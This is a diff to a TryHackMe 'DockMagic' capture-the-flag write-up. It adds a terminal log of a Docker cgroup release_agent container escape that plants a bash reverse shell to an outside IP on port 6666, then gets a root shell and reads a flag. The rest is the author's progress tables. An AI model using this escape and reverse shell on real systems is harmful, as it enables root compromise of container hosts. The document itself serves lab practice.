@@ -1,6 +1,6 @@
 <h1 align="center"><a href="https://tryhackme.com/room/dockmagic">DockMagic</a></h1>
 <p align="center"><img width="590px" src="https://github.com/user-attachments/assets/64d14763-8ff5-46fa-a0b0-7946c6cfc013"><br>
-If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAR%2019-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p
+If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAR%2020-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p
 
 <br>
 <br>
@@ -793,14 +793,132 @@ Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docke
 ==============================================================================================
 ```
 
+```
+root@23348446b037:/tmp# ls -lah
+total 12K
+drwxrwxrwt 1 root root 4.0K Mar 20 20:39 .
+drwxr-xr-x 1 root root 4.0K Aug 15  2023 ..
+drwxr-xr-x 2 root root 4.0K Aug  5  2023 ImageMagick
+dr-xr-xr-x 4 root root    0 Mar 20 19:52 cgrp
+root@23348446b037:/tmp# echo 1 > /tmp/cgrp/x/notify_on_release
+root@23348446b037:/tmp# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+root@23348446b037:/tmp# echo "$host_path/cmd" > /tmp/cgrp/release_agent
+root@23348446b037:/tmp# echo '#!/bin/bash' > /cmd
+>> /cmd348446b037:/tmp# echo "/bin/bash -i >& /dev/tcp/10.65.116.225/6666 0>&1"  
+root@23348446b037:/tmp# chmod a+x /cmd
+root@23348446b037:/tmp# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+```
+:~/DockMagic# nc -nlvp 6666
+...
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dockmagic:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@dockmagic:/root# python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@dockmagic:/root# export TERM=xterm
+export TERM=xterm
+root@dockmagic:/root# ^Z
+[1]+  Stopped                 nc -nlvp 6666
+:~/DockMagic# stty raw -echo; fg
+nc -nlvp 6666
+
+root@dockmagic:/root# cd ..
+root@dockmagic:/# cd home
+root@dockmagic:/home# ls -lah
+total 12K
+drwxr-xr-x  3 root    root    4.0K Feb 15  2023 .
+drwxr-xr-x 19 root    root    4.0K Feb 15  2023 ..
+drwxr-xr-x  4 vagrant vagrant 4.0K Aug 15  2023 vagrant
+root@dockmagic:/home# cd vagrant
+root@dockmagic:/home/vagrant# ls -lah
+total 56K
+drwxr-xr-x 4 vagrant vagrant 4.0K Aug 15  2023 .
+drwxr-xr-x 3 root    root    4.0K Feb 15  2023 ..
+-rw------- 1 vagrant vagrant 7.0K Aug 15  2023 .bash_history
+-rw-r--r-- 1 vagrant vagrant  220 Feb 15  2023 .bash_logout
+-rw-r--r-- 1 vagrant vagrant 3.7K Feb 15  2023 .bashrc
+drwxr-xr-x 2 vagrant vagrant 4.0K Feb 15  2023 .cache
+-rw-r--r-- 1 vagrant vagrant  807 Feb 15  2023 .profile
+drwx------ 2 vagrant vagrant 4.0K Mar 16  2023 .ssh
+-rw------- 1 vagrant vagrant  12K Aug 15  2023 .viminfo
+-rw-r--r-- 1 vagrant vagrant   13 Feb 15  2023 .vimrc
+-rw-r--r-- 1 root    root      38 Mar 16  2023 flag3.txt
+root@dockmagic:/home/vagrant# cat flag3.txt
+THM{••••••••••••••••••••••••••••••••}
+```
+
+<img width="1079" height="651" alt="image" src="https://github.com/user-attachments/assets/1130d337-eefe-4de6-bf7b-d242f8d9be0f" />
+
+<br>
 <br>
 
-<p>1.1. <br>
-<code></code></p>
+<p>1.1. What is the value of flag 1?<br>
+<code>THM{••••••••••••••••••••••••••••••••}</code></p>
 
-<p>1.2. <br>
-<code></code></p>
+<p>1.2. What is the value of flag 2?<br>
+<code>THM{•••••••••••••••••••••••••••••••••}</code></p>
 
-<p>1.3. <br>
-<code></code></p>
+<p>1.3. What is the value of flag 3?<br>
+<code>THM{••••••••••••••••••••••••••••••••}</code></p>
 
+
+<br>
+<br>
+<h1 align="center">Completed</h1>
+
+<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/df310d62-12e9-407b-9550-bbf9b6aecc94"><br>
+                  <img width="900px" src="https://github.com/user-attachments/assets/1292c563-35d1-4529-923c-f9647d5fbc9e"><br>
+                  <img width="900px" src="https://github.com/user-attachments/assets/3838536e-0311-4476-9d58-d0ce767f1108"></p>
+
+<h1 align="center">My TryHackMe Journey ・ 2026, March<a id='9'></a></h1>
+
+<div align="center"><h6>
+
+|Day<br><br><br> |Streak<br><br><br>|Room Name<br><br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|League<br><br><br>|
+|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|---------------:|
+|20<br><br>      |78<br><br>        |DockMagic<br><br>                |Medium<br><br> |🔗<br><br>| 1,155<br><br>| 161,755<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|20<br><br>      |78<br><br>        |Microsoft Intune Monitoring<br>  |Medium<br><br> |🔗<br><br>| 1,154<br><br>| 161,725<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|20<br><br>      |78<br><br>        |SharePoint Online Monitoring<br> |Medium<br><br> |🔗<br><br>| 1,153<br><br>| 161,629<br><br>| 91<br><br>| 14ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|19<br><br>      |77<br><br>        |Detecting AD Post-Exploitation<br>|Hard<br><br>  |🔗<br><br>| 1,152<br><br>| 161,517<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|19<br><br>      |77<br><br>        |DockMagic - in progress<br><br>  |Medium<br><br> |🚩<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Phishing Unfolding<br><br>       |Medium<br><br> |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Dev Diaries<br><br>              |Easy<br><br>   |🚩<br><br>| 1,151<br><br>| 161,273<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|17<br><br>      |75<br><br>        |Missing Person<br><br>           |Easy<br><br>   |🚩<br><br>| 1,150<br><br>| 161,123<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|1ˢᵗ<br><br>|
+|17<br><br><br>  |75<br><br><br>    |Detecting AD Lateral Movement<br><br>|Medium<br><br><br>|🔗<br><br><br>| 1,149<br><br><br>| 160,883<br><br><br>| 91<br><br><br>| 16ᵗʰ<br><br><br>| 9ᵗʰ<br><br><br>| 2ⁿᵈ<br><br><br>| 1ˢᵗ<br><br><br>|-<br><br><br>|
+|12<br><br>      |70<br><br>        |Entra ID Monitoring<br><br>      |Medium<br><br> |🔗<br><br>| 1,147<br><br>| 160,479<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|5ᵗʰ<br><br>|
+|12<br><br>      |70<br><br>        |Introduction to Phishing<br>     |Easy<br><br>   |⚙️<br><br>| 1,146<br><br>| 160,343<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|6ᵗʰ<br><br>|
+|11<br><br>      |69<br><br>        |Detecting AD Initial Access<br>  |Medium<br><br> |🔗<br><br>| 1,146<br><br>| 160,195<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|4ᵗʰ<br><br>|
+|11<br><br>      |69<br><br>        |Minotaur´s Labyrinth<br><br>     |Medium<br><br> |🚩<br><br>| 1,145<br><br>| 160,051<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|9ᵗʰ<br><br>|
+|10<br><br>      |68<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,144<br><br>| 160,021<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|10<br><br>      |68<br><br>        |M365 Monitoring Basics<br><br>   |Medium<br><br> |🔗<br><br>| 1,144<br><br>| 160,016<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|9<br><br>       |67<br><br>        |Advent of Cyber 2022<br><br>     |Easy  <br><br> |🔗<br><br>| 1,143<br><br>| 159,880<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|8<br><br>       |66<br><br>        |Windows Reversing Intro<br>      |Medium<br><br> |🔗<br><br>| 1,142<br><br>|        <br><br>| 91<br><br>|     <br><br>|    <br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|8<br><br>       |66<br><br>        |Advent of Cyber 2 [2020]<br>     |Easy<br><br>   |🔗<br><br>| 1,141<br><br>| 159,164<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|8<br><br>       |66<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,140<br><br>| 159,068<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|7<br><br>       |65<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|6<br><br>       |64<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|6<br><br>       |64<br><br>        |Persistence: T1053<br>           |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|5<br><br>       |63<br><br>        |LOVELETTER.EXE<br><br>           |Hard<br><br>   |🚩<br><br>| 1,139<br><br>| 158,294<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Monitoring AWS Workloads<br>     |Medium<br><br> |🔗<br><br>| 1,139<br><br>| 157,994<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Kernel Blackout<br><br>          |Medium<br><br> |🚩<br><br>| 1,138<br><br>| 157,978<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Operation Endgame<br><br>        |Hard<br><br>   |🚩<br><br>| 1,137<br><br>| 157,578<br><br>| 90<br><br>| 23ʳᵈ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|7ᵗʰ<br><br>|
+|4<br><br>       |62<br><br>        |Monitoring Active Directory<br>  |Medium<br><br> |🔗<br><br>| 1,136<br><br>| 157,396<br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|3<br><br>       |61<br><br>        |Monitoring AWS Services<br>      |Medium<br><br> |🔗<br><br>| 1,135<br><br>|        <br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|2<br><br>       |60<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|1<br><br>       |59<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+
+</h6></div><br>
+
+<h1 align="center">My TryHackMe Journey ・ 2026, March</h1>
+<p align="center">Global All Time:      14ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/155a865a-fc46-4aa8-b81a-a6f10312429d"><br><br>
+                  Global Monthly:        9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2ed8a207-3e47-4c24-9138-30a4aac21b72"><br><br>
+                  Brazil All Time:       2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/07108ed7-8f7b-45ff-8d43-59d5fe965a45"><br><br>
+                  Brazil Monthly:        1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/cfdf48a7-f46a-407d-b285-dd3ba59ab31e"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
